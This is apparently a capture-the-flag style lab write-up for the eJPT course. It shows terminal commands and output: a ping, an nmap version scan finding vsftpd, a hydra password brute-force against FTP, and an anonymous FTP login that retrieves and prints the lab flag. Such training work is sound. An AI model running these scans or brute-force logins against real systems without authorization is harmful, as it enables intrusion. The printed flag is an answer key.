```jsx
Lab Name: VSFTPD Recon: Basics
Platform: INE
Lab No: 08
Exam: eJPT (Jr. Penetartion Tester)
```

## Pinging:

```console
┌──(root㉿INE)-[~]
└─# ping demo.ine.local
PING demo.ine.local (192.226.68.3) 56(84) bytes of data.
64 bytes from demo.ine.local (192.226.68.3): icmp_seq=1 ttl=64 time=0.083 ms
64 bytes from demo.ine.local (192.226.68.3): icmp_seq=2 ttl=64 time=0.032 ms
64 bytes from demo.ine.local (192.226.68.3): icmp_seq=3 ttl=64 time=0.035 ms
64 bytes from demo.ine.local (192.226.68.3): icmp_seq=4 ttl=64 time=0.033 ms
^C
--- demo.ine.local ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3066ms
rtt min/avg/max/mdev = 0.032/0.045/0.083/0.021 ms
```

## NMAP Scan:

```console
┌──(root㉿INE)-[~]
└─# nmap -sV demo.ine.local
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-23 17:49 IST
Nmap scan report for demo.ine.local (192.226.68.3)
Host is up (0.000021s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
MAC Address: 02:42:C0:E2:44:03 (Unknown)
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.32 seconds
```

## Login:

```console
┌──(root㉿INE)-[~]
└─# hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt demo.ine.local ftp
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-08-23 17:51:16
[DATA] max 16 tasks per 1 server, overall 16 tasks, 7063 login tries (l:7/p:1009), ~442 tries per task
[DATA] attacking ftp://demo.ine.local:21/
1 of 1 target completed, 0 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-08-23 17:51:20
```

```console
┌──(root㉿INE)-[~]                                                                             
└─# ftp demo.ine.local
Connected to demo.ine.local.
220 (vsFTPd 3.0.3)
Name (demo.ine.local:root): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||56045|)
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp            33 Dec 18  2018 flag
drwxr-xr-x    2 ftp      ftp          4096 Dec 18  2018 pub
226 Directory send OK.
ftp> get flag
local: flag remote: flag
229 Entering Extended Passive Mode (|||56778|)
150 Opening BINARY mode data connection for flag (33 bytes).
100% |**************************************************|    33      749.45 KiB/s    00:00 ETA
226 Transfer complete.
33 bytes received in 00:00 (64.71 KiB/s)
ftp> bye
221 Goodbye.
```

```console
┌──(root㉿INE)-[~]
└─# cat flag                                                                                   
4267bdfbff77d7c2635e4572519a8b9c
```

---
